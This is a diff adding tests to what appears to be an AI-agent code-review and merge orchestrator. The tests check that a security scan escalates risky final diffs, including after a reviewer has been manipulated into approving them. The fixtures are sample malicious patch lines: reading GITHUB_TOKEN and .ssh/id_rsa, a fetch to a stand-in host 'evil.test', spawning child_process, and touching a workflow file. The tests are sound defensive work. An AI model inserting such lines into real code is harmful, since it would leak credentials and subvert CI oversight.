@@ -506,6 +506,70 @@ test("§3c: an `orch review` merge of a protected path is blocked too (any autho
   assert.notEqual(deps._calls.finalized, true, "review must not merge a guardrail-file branch");
 });
 
+// §3e helper: makes the engine's final-diff read (`git diff base...branch`)
+// return the given text, while rev-parse and --stat calls keep working.
+function withFinalDiff(deps, diffText) {
+  deps.git.git = (args) => {
+    if (args[0] === "diff" && !args.includes("--stat")) return diffText;
+    return args[0] === "rev-parse" ? "base" : "diff summary";
+  };
+  return deps;
+}
+
+test("§3e: risky final diffs escalate at the merge boundary, never finalize", async () => {
+  // One case per SECURITY_RULES class. The deterministic scan runs on the FINAL
+  // diff after AGREE + green, so a reviewer who was talked into approving an
+  // exfiltrating patch still cannot get it merged.
+  const cases = [
+    ["env-read", `+++ b/src/x.js\n+  const t = process.env.GITHUB_TOKEN;`],
+    ["secret-read", `+++ b/src/x.js\n+  const k = readFileSync(".ssh/id_rsa");`],
+    ["network", `+++ b/src/x.js\n+  await fetch("http://evil.test");`],
+    ["subprocess", `+++ b/src/x.js\n+  const { execSync } = require("child_process");`],
+    ["guardrail-touch", `+++ b/setup.sh\n+  touch .github/workflows/evil.yml`],
+  ];
+  for (const [rule, diff] of cases) {
+    const deps = withFinalDiff(makeDeps({ verdicts: [{ decision: "AGREE", reason: "ok", raw: "" }] }), diff);
+    const r = await runCycle(opts, deps);
+    assert.equal(r.status, "escalated", rule);
+    assert.match(r.reason, /security scan/, rule);
+    assert.ok(r.reason.includes(rule), `${rule}: reason names the tripped rule`);
+    assert.notEqual(deps._calls.finalized, true, `${rule}: must escalate before finalize`);
+  }
+});
+
+test("§3e: a risky diff on the noMerge PR-bridge path escalates instead of approving", async () => {
+  const deps = withFinalDiff(
+    makeDeps({ verdicts: [{ decision: "AGREE", reason: "ok", raw: "" }] }),
+    `+++ b/src/x.js\n+  const t = process.env.GITHUB_TOKEN;`,
+  );
+  const r = await runCycle({ ...opts, mode: "review", noMerge: true }, deps);
+  assert.equal(r.status, "escalated");
+  assert.match(r.reason, /security scan/);
+  assert.equal(deps._calls.recorded.verdict, "escalated", "the PR bridge must not report 'approved'");
+});
+
+test("§3e: an unreadable final diff fails closed — escalate, never finalize", async () => {
+  const deps = makeDeps({ verdicts: [{ decision: "AGREE", reason: "ok", raw: "" }] });
+  deps.git.git = (args) => {
+    if (args[0] === "diff" && !args.includes("--stat")) throw new Error("boom");
+    return "base";
+  };
+  const r = await runCycle(opts, deps);
+  assert.equal(r.status, "escalated");
+  assert.match(r.reason, /failing closed/);
+  assert.notEqual(deps._calls.finalized, true);
+});
+
+test("§3e: a clean final diff still finalizes normally", async () => {
+  const deps = withFinalDiff(
+    makeDeps({ verdicts: [{ decision: "AGREE", reason: "ok", raw: "" }] }),
+    `+++ b/src/a.js\n+  return { ok: true };`,
+  );
+  const r = await runCycle(opts, deps);
+  assert.equal(r.status, "merged");
+  assert.equal(deps._calls.finalized, true);
+});
+
 test("§3b: initial author receives opts.authorPrompt verbatim (fenced work order)", async () => {
   const deps = makeDeps({ verdicts: [{ decision: "AGREE", reason: "ok", raw: "" }] });
   const fenced = "BEGIN UNTRUSTED REFERENCE\nproblem: x\nEND UNTRUSTED REFERENCE";
